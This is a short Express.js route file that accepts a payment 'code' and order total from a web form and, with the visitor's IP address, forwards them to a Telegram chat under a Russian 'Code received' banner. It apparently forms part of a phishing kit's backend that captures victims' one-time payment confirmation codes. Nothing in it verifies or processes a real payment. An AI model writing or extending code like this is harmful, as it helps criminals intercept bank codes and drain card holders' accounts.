import express from 'express';
const router = express.Router();
import { sendTelegramMessage } from '../utils/telegramSender';


router.post('/api/payment/code', async (req, res) => {
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    if (Array.isArray(clientIP)) {
        clientIP = clientIP[0];
    } else if (!clientIP || clientIP === "") {
        clientIP = "IP неизвестен";
    }   
    
    const totalPrice = req.body.totalPrice;
    const code = req.body.code;

    const messageText = `
        <b>✨ Получен код ✨</b>\n\n❗️ <strong>${code}</strong> ❗️\n\n💰 <b>${totalPrice} ₽</b>
    `;

    const result = await sendTelegramMessage(clientIP, messageText);
    res.json(result);
   
});


export default router;